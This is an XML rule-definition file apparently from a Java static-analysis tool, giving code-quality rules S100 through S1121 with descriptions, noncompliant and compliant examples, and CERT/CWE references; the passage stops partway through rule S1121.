<rules>
    <rule key='DuplicatedBlocks' priority='MAJOR'>
        <configKey>DuplicatedBlocks</configKey>
        <name>Source files should not have any duplicated blocks</name>
        <description>An issue is created on a file as soon as there is at least one block of duplicated code on this
            file
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S100' priority='MINOR'>
        <configKey>S100</configKey>
        <name>Method names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared naming conventions allow teams to collaborate efficiently. This rule checks that all method
            names match a provided regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With default provided regular expression &lt;code&gt;^[a-z][a-zA-Z0-9]*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            public int DoSomething(){...}
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public int doSomething(){...}
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Overriding methods are excluded. &lt;/p&gt;
            &lt;pre&gt;
            @Override
            public int Do_Something(){...}
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the method names against.</description>
            <defaultValue>^[a-z][a-zA-Z0-9]*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S101' priority='MINOR'>
        <configKey>S101</configKey>
        <name>Class names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared coding conventions allow teams to collaborate effectively. This rule allows to check that
            all class names match a provided regular
            expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With default provided regular expression &lt;code&gt;^[A-Z][a-zA-Z0-9]*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            class my_class {...}
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {...}
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the class names against.</description>
            <defaultValue>^[A-Z][a-zA-Z0-9]*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S106' priority='MAJOR'>
        <configKey>S106</configKey>
        <name>Standard outputs should not be used directly to log anything</name>
        <description>
            &lt;p&gt;When logging a message there are several important requirements which must be fulfilled:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The user must be able to easily retrieve the logs &lt;/li&gt;
            &lt;li&gt; The format of all logged message must be uniform to allow the user to easily read the log &lt;/li&gt;
            &lt;li&gt; Logged data must actually be recorded &lt;/li&gt;
            &lt;li&gt; Sensitive data must only be logged securely &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;If a program directly writes to the standard outputs, there is absolutely no way to comply with
            those requirements. That's why defining and using a
            dedicated logger is highly recommended.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            System.out.println(&quot;My Message&quot;); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            logger.log(&quot;My Message&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/nzdGBQ&quot;&gt;CERT, ERR02-J.&lt;/a&gt; -
            Prevent exceptions while logging data &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>cert</tag>
        <tag>owasp-a3</tag>
        <securityStandards>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S1065' priority='MAJOR'>
        <configKey>S1065</configKey>
        <name>Unused labels should be removed</name>
        <description>
            &lt;p&gt;If a label is declared but not used in the program, it can be considered as dead code and should
            therefore be removed.&lt;/p&gt;
            &lt;p&gt;This will improve maintainability as developers will not wonder what this label is used for.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            void foo() {
            outer: //label is not used.
            for(int i = 0; i&amp;lt;10; i++) {
            break;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            void foo() {
            for(int i = 0; i&amp;lt;10; i++) {
            break;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5dUxBQ&quot;&gt;CERT, MSC12-C.&lt;/a&gt; -
            Detect and remove code that has no effect or is never executed
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S1066' priority='MAJOR'>
        <configKey>S1066</configKey>
        <name>Collapsible &quot;if&quot; statements should be merged</name>
        <description>
            &lt;p&gt;Merging collapsible &lt;code&gt;if&lt;/code&gt; statements increases the code's readability.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (file != null) {
            if (file.isFile() || file.isDirectory()) {
            /* ... */
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (file != null &amp;amp;&amp;amp; isFileOrDirectory(file)) {
            /* ... */
            }

            private static boolean isFileOrDirectory(File file) {
            return file.isFile() || file.isDirectory();
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S1068' priority='MAJOR'>
        <configKey>S1068</configKey>
        <name>Unused &quot;private&quot; fields should be removed</name>
        <description>
            &lt;p&gt;If a &lt;code&gt;private&lt;/code&gt; field is declared but not used in the program, it can be
            considered dead code and should therefore be removed. This will
            improve maintainability because developers will not wonder what the variable is used for.&lt;/p&gt;
            &lt;p&gt;Note that this rule does not take reflection into account, which means that issues will be raised
            on &lt;code&gt;private&lt;/code&gt; fields that are only
            accessed using the reflection API.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            private int foo = 42;

            public int compute(int a) {
            return a * 42;
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            public int compute(int a) {
            return a * 42;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;The Java serialization runtime associates with each serializable class a version number, called
            &lt;code&gt;serialVersionUID&lt;/code&gt;, which is used during
            deserialization to verify that the sender and receiver of a serialized object have loaded classes for that
            object that are compatible with respect to
            serialization.&lt;/p&gt;
            &lt;p&gt;A serializable class can declare its own &lt;code&gt;serialVersionUID&lt;/code&gt; explicitly by
            declaring a field named &lt;code&gt;serialVersionUID&lt;/code&gt; that
            must be static, final, and of type long. By definition those &lt;code&gt;serialVersionUID&lt;/code&gt;
            fields should not be reported by this rule:&lt;/p&gt;
            &lt;pre&gt;
            public class MyClass implements java.io.Serializable {
            private static final long serialVersionUID = 42L;
            }
            &lt;/pre&gt;
            &lt;p&gt;Moreover, this rule doesn't raise any issue on annotated fields.&lt;/p&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S107' priority='MAJOR'>
        <configKey>S107</configKey>
        <name>Methods should not have too many parameters</name>
        <description>
            &lt;p&gt;A long parameter list can indicate that a new structure should be created to wrap the numerous
            parameters or that the function is doing too many
            things.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With a maximum number of 4 parameters:&lt;/p&gt;
            &lt;pre&gt;
            public void doSomething(int param1, int param2, int param3, String param4, long param5) {
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(int param1, int param2, int param3, String param4) {
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Methods annotated with :&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Spring's &lt;code&gt;@RequestMapping&lt;/code&gt; (and related shortcut annotations, like &lt;code&gt;@GetRequest&lt;/code&gt;)
            &lt;/li&gt;
            &lt;li&gt; JAX-RS API annotations (like &lt;code&gt;@javax.ws.rs.GET&lt;/code&gt;) &lt;/li&gt;
            &lt;li&gt; Bean constructor injection with &lt;code&gt;@org.springframework.beans.factory.annotation.Autowired&lt;/code&gt;
            &lt;/li&gt;
            &lt;li&gt; CDI constructor injection with &lt;code&gt;@javax.inject.Inject&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;@com.fasterxml.jackson.annotation.JsonCreator&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;may have a lot of parameters, encapsulation being possible. Such methods are therefore ignored.&lt;/p&gt;
        </description>
        <tag>brain-overload</tag>
        <param>
            <key>max</key>
            <description>Maximum authorized number of parameters</description>
            <defaultValue>7</defaultValue>
            <type>INTEGER</type>
        </param>
        <param>
            <key>constructorMax</key>
            <description>Maximum authorized number of parameters for a constructor</description>
            <defaultValue>7</defaultValue>
            <type>INTEGER</type>
        </param>
    </rule>

    <rule key='S1075' priority='MINOR'>
        <configKey>S1075</configKey>
        <name>URIs should not be hardcoded</name>
        <description>
            &lt;p&gt;Hard coding a URI makes it difficult to test a program: path literals are not always portable
            across operating systems, a given absolute path may
            not exist on a specific test environment, a specified Internet URL may not be available when executing the
            tests, production environment filesystems
            usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard
            coded. Instead, it should be replaced by
            customizable parameter.&lt;/p&gt;
            &lt;p&gt;Further even if the elements of a URI are obtained dynamically, portability can still be limited if
            the path-delimiters are hard-coded.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when URI's or path delimiters are hard coded.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            public Collection&amp;lt;User&amp;gt; listUsers() {
            File userList = new File(&quot;/home/mylogin/Dev/users.txt&quot;); // Non-Compliant
            Collection&amp;lt;User&amp;gt; users = parse(userList);
            return users;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            // Configuration is a class that returns customizable properties: it can be mocked to be injected during
            tests.
            private Configuration config;
            public Foo(Configuration myConfig) {
            this.config = myConfig;
            }
            public Collection&amp;lt;User&amp;gt; listUsers() {
            // Find here the way to get the correct folder, in this case using the Configuration object
            String listingFolder = config.getProperty(&quot;myApplication.listingFolder&quot;);
            // and use this parameter instead of the hard coded path
            File userList = new File(listingFolder, &quot;users.txt&quot;); // Compliant
            Collection&amp;lt;User&amp;gt; users = parse(userList);
            return users;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/OjdGBQ&quot;&gt;CERT, MSC03-J.&lt;/a&gt; -
            Never hard code sensitive information &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>android</tag>
        <tag>cert</tag>
    </rule>

    <rule key='S108' priority='MAJOR'>
        <configKey>S108</configKey>
        <name>Nested blocks of code should not be left empty</name>
        <description>
            &lt;p&gt;Most of the time a block of code is empty when a piece of code is really missing. So such empty
            block must be either filled or removed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (int i = 0; i &amp;lt; 42; i++){} // Empty on purpose or missing piece of code ?
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;When a block contains a comment, this block is not considered to be empty unless it is a &lt;code&gt;synchronized&lt;/code&gt;
            block. &lt;code&gt;synchronized&lt;/code&gt;
            blocks are still considered empty even with comments because they can still affect program flow.&lt;/p&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S110' priority='MAJOR'>
        <configKey>S110</configKey>
        <name>Inheritance tree of classes should not be too deep</name>
        <description>
            &lt;p&gt;Inheritance is certainly one of the most valuable concepts in object-oriented programming. It's a
            way to compartmentalize and reuse code by
            creating collections of attributes and behaviors called classes which can be based on previously created
            classes. But abusing this concept by creating
            a deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time too deep
            of an inheritance tree is due to bad object
            oriented design which leads to a systematic use of 'inheritance' when 'composition' would be better suited.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the inheritance tree, starting from &lt;code&gt;Object&lt;/code&gt;
            has a greater depth than is allowed. &lt;/p&gt;
            &lt;p&gt;For the parameter of the rule, the following rules are applied:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;?&lt;/code&gt; matches a single character &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;*&lt;/code&gt; matches zero or more characters &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;**&lt;/code&gt; matches zero or more packages &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Examples:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;java.fwk.AbstractFwkClass&lt;/code&gt; will stop count when AbstractFwkClassclass is
            reached. &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.fwk.*&lt;/code&gt; will stop count when any member of java.fwkPackage package is
            reached. &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.fwk.**&lt;/code&gt; same as above, but including sub-packages. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Exceptions:&lt;/p&gt;
            &lt;p&gt;The rule stops counting when it encounters a class from one of the following packages (or
            sub-packages):&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;android.**&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.intellij.**&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;com.persistit.**&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;javax.swing.**&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;org.eclipse.**&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;org.springframework.**&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>design</tag>
        <param>
            <key>max</key>
            <description>Maximum depth of the inheritance tree. (Number)</description>
            <defaultValue>5</defaultValue>
            <type>INTEGER</type>
        </param>
        <param>
            <key>filteredClasses</key>
            <description>Classes to be filtered out of the count of inheritance. Ex : java.fwk.AbstractFwkClass,
                java.fwkPackage.*
            </description>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1104' priority='MINOR'>
        <configKey>S1104</configKey>
        <name>Class variable fields should not have public accessibility</name>
        <description>
            &lt;p&gt;Public class variable fields do not respect the encapsulation principle and has three main
            disadvantages:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Additional behavior such as validation cannot be added. &lt;/li&gt;
            &lt;li&gt; The internal representation is exposed, and cannot be changed afterwards. &lt;/li&gt;
            &lt;li&gt; Member values are subject to change from anywhere in the code and may not meet the programmer's
            assumptions. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;By using private attributes and accessor methods (set and get), unauthorized modifications are
            prevented.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            public static final int SOME_CONSTANT = 0; // Compliant - constants are not checked

            public String firstName; // Noncompliant

            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            public static final int SOME_CONSTANT = 0; // Compliant - constants are not checked

            private String firstName; // Compliant

            public String getFirstName() {
            return firstName;
            }

            public void setFirstName(String firstName) {
            this.firstName = firstName;
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Because they are not modifiable, this rule ignores &lt;code&gt;public final&lt;/code&gt; fields.
            Also, annotated fields, whatever the annotation(s) will be
            ignored, as annotations are often used by injection frameworks, which in exchange require having public
            fields.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/493.html&quot;&gt;MITRE, CWE-493&lt;/a&gt;
            - Critical Public Variable Without Final Modifier &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
    </rule>

    <rule key='S1110' priority='MAJOR'>
        <configKey>S1110</configKey>
        <name>Redundant pairs of parentheses should be removed</name>
        <description>
            &lt;p&gt;The use of parentheses, even those not required to enforce a desired order of operations, can
            clarify the intent behind a piece of code. But
            redundant pairs of parentheses could be misleading, and should be removed. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int x = (y / 2 + 1); //Compliant even if the parenthesis are ignored by the compiler

            if (a &amp;amp;&amp;amp; ((x+y &amp;gt; 0))) { // Noncompliant
            //...
            }

            return ((x + 1)); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int x = (y / 2 + 1);

            if (a &amp;amp;&amp;amp; (x+y &amp;gt; 0)) {
            //...
            }

            return (x + 1);
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S1111' priority='MAJOR'>
        <configKey>S1111</configKey>
        <name>The Object.finalize() method should not be called</name>
        <description>
            &lt;p&gt;According to the official javadoc documentation, this Object.finalize() is called by the garbage
            collector on an object when garbage collection
            determines that there are no more references to the object. Calling this method explicitly breaks this
            contract and so is misleading. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void dispose() throws Throwable {
            this.finalize(); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/586.html&quot;&gt;MITRE, CWE-586&lt;/a&gt;
            - Explicit Call to Finalize() &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/4jZGBQ&quot;&gt;CERT, MET12-J.&lt;/a&gt; -
            Do not use finalizers &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1113' priority='CRITICAL'>
        <configKey>S1113</configKey>
        <name>The Object.finalize() method should not be overridden</name>
        <description>
            &lt;p&gt;The &lt;code&gt;Object.finalize()&lt;/code&gt; method is called on an object by the garbage
            collector when it determines that there are no more references to
            the object. But there is absolutely no warranty that this method will be called AS SOON AS the last
            references to the object are removed. It can be
            few microseconds to few minutes later. So when system resources need to be disposed by an object, it's
            better to not rely on this asynchronous
            mechanism to dispose them.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            ...
            protected void finalize() {
            releaseSomeResources(); // Noncompliant
            }
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/4jZGBQ&quot;&gt;CERT, MET12-J.&lt;/a&gt; -
            Do not use finalizers &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>unpredictable</tag>
    </rule>

    <rule key='S1114' priority='CRITICAL'>
        <configKey>S1114</configKey>
        <name>&quot;super.finalize()&quot; should be called at the end of &quot;Object.finalize()&quot;
            implementations
        </name>
        <description>
            &lt;p&gt;Overriding the &lt;code&gt;Object.finalize()&lt;/code&gt; method must be done with caution to
            dispose some system resources.&lt;/p&gt;
            &lt;p&gt;Calling the &lt;code&gt;super.finalize()&lt;/code&gt; at the end of this method implementation is
            highly recommended in case parent implementations must also
            dispose some system resources.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            protected void finalize() { // Noncompliant; no call to super.finalize();
            releaseSomeResources();
            }

            protected void finalize() {
            super.finalize(); // Noncompliant; this call should come last
            releaseSomeResources();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            protected void finalize() {
            releaseSomeResources();
            super.finalize();
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/568.html&quot;&gt;MITRE, CWE-568&lt;/a&gt;
            - finalize() Method Without super.finalize() &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/4jZGBQ&quot;&gt;CERT, MET12-J.&lt;/a&gt; -
            Do not use finalizers &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1116' priority='MINOR'>
        <configKey>S1116</configKey>
        <name>Empty statements should be removed</name>
        <description>
            &lt;p&gt;Empty statements, i.e. &lt;code&gt;;&lt;/code&gt;, are usually introduced by mistake, for example
            because:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; It was meant to be replaced by an actual statement, but this was forgotten. &lt;/li&gt;
            &lt;li&gt; There was a typo which lead the semicolon to be doubled, i.e. &lt;code&gt;;;&lt;/code&gt;. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            void doSomething() {
            ; // Noncompliant - was used as a kind of TODO marker
            }

            void doSomethingElse() {
            System.out.println(&quot;Hello, world!&quot;);; // Noncompliant - double ;
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            void doSomething() {}

            void doSomethingElse() {
            System.out.println(&quot;Hello, world!&quot;);
            ...
            for (int i = 0; i &amp;lt; 3; i++) ; // compliant if unique statement of a loop
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5dUxBQ&quot;&gt;CERT, MSC12-C.&lt;/a&gt; -
            Detect and remove code that has no effect or is never executed
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/IDZGBQ&quot;&gt;CERT, MSC51-J.&lt;/a&gt; -
            Do not place a semicolon immediately following an if, for, or while
            condition &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/WtYxBQ&quot;&gt;CERT, EXP15-C.&lt;/a&gt; -
            Do not place a semicolon on the same line as an if, for, or while
            statement &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S1117' priority='MAJOR'>
        <configKey>S1117</configKey>
        <name>Local variables should not shadow class fields</name>
        <description>
            &lt;p&gt;Overriding or shadowing a variable declared in an outer scope can strongly impact the readability,
            and therefore the maintainability, of a piece of
            code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but
            are really using another.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class Foo {
            public int myField;

            public void doSomething() {
            int myField = 0;
            ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes&quot;&gt;CERT,
            DCL01-C.&lt;/a&gt; - Do not reuse
            variable names in subscopes &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes&quot;&gt;CERT,
            DCL51-J.&lt;/a&gt; - Do
            not shadow or obscure identifiers in subscopes &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>pitfall</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1118' priority='MAJOR'>
        <configKey>S1118</configKey>
        <name>Utility classes should not have public constructors</name>
        <description>
            &lt;p&gt;Utility classes, which are collections of &lt;code&gt;static&lt;/code&gt; members, are not meant to
            be instantiated. Even abstract utility classes, which can
            be extended, should not have public constructors.&lt;/p&gt;
            &lt;p&gt;Java adds an implicit public constructor to every class which does not define at least one
            explicitly. Hence, at least one non-public constructor
            should be defined.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class StringUtils { // Noncompliant

            public static String concatenate(String s1, String s2) {
            return s1 + s2;
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class StringUtils { // Compliant

            private StringUtils() {
            throw new IllegalStateException(&quot;Utility class&quot;);
            }

            public static String concatenate(String s1, String s2) {
            return s1 + s2;
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;When class contains &lt;code&gt;public static void main(String[] args)&lt;/code&gt; method it is
            not considered as utility class and will be ignored by this
            rule.&lt;/p&gt;
        </description>
        <tag>design</tag>
    </rule>

    <rule key='S1119' priority='MAJOR'>
        <configKey>S1119</configKey>
        <name>Labels should not be used</name>
        <description>
            &lt;p&gt;Labels are not commonly used in Java, and many developers do not understand how they work.
            Moreover, their usage makes the control flow harder to
            follow, which reduces the code's readability.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int matrix[][] = {
            {1, 2, 3},
            {4, 5, 6},
            {7, 8, 9}
            };

            outer: for (int row = 0; row &amp;lt; matrix.length; row++) { // Non-Compliant
            for (int col = 0; col &amp;lt; matrix[row].length; col++) {
            if (col == row) {
            continue outer;
            }
            System.out.println(matrix[row][col]); // Prints the elements under the diagonal, i.e. 4, 7 and 8
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            for (int row = 1; row &amp;lt; matrix.length; row++) { // Compliant
            for (int col = 0; col &amp;lt; row; col++) {
            System.out.println(matrix[row][col]); // Also prints 4, 7 and 8
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S112' priority='MAJOR'>
        <configKey>S112</configKey>
        <name>Generic exceptions should never be thrown</name>
        <description>
            &lt;p&gt;Using such generic exceptions as &lt;code&gt;Error&lt;/code&gt;, &lt;code&gt;RuntimeException&lt;/code&gt;,
            &lt;code&gt;Throwable&lt;/code&gt;, and &lt;code&gt;Exception&lt;/code&gt; prevents
            calling methods from handling true, system-generated exceptions differently than application-generated
            errors. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void foo(String bar) throws Throwable { // Noncompliant
            throw new RuntimeException(&quot;My Message&quot;); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void foo(String bar) {
            throw new MyOwnRuntimeException(&quot;My Message&quot;);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Generic exceptions in the signatures of overriding methods are ignored, because overriding method
            has to follow signature of the throw declaration
            in the superclass. The issue will be raised on superclass declaration of the method (or won't be raised at
            all if superclass is not part of the
            analysis).&lt;/p&gt;
            &lt;pre&gt;
            @Override
            public void myMethod() throws Exception {...}
            &lt;/pre&gt;
            &lt;p&gt;Generic exceptions are also ignored in the signatures of methods that make calls to methods that
            throw generic exceptions.&lt;/p&gt;
            &lt;pre&gt;
            public void myOtherMethod throws Exception {
            doTheThing(); // this method throws Exception
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/397.html&quot;&gt;MITRE, CWE-397&lt;/a&gt;
            - Declaration of Throws for Generic Exception &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/_DdGBQ&quot;&gt;CERT, ERR07-J.&lt;/a&gt; -
            Do not throw RuntimeException, Exception, or Throwable &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>error-handling</tag>
    </rule>

    <rule key='S1121' priority='MAJOR'>
        <configKey>S1121</configKey>
        <name>Assignments should not be made from within sub-expressions</name>
        <description>
            &lt;p&gt;Assignments within sub-expressions are hard to spot and therefore make the code less readable.
            Ideally, sub-expressions should not have
            side-effects.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if ((str = cont.substring(pos1, pos2)).isEmpty()) { // Noncompliant
            //...
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            str = cont.substring(pos1, pos2);
            if (str.isEmpty()) {
            //...
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Assignments in &lt;code&gt;while&lt;/code&gt; statement conditions, and assignments enclosed in
            relational expressions are ignored.&lt;/p&gt;
            &lt;pre&gt;
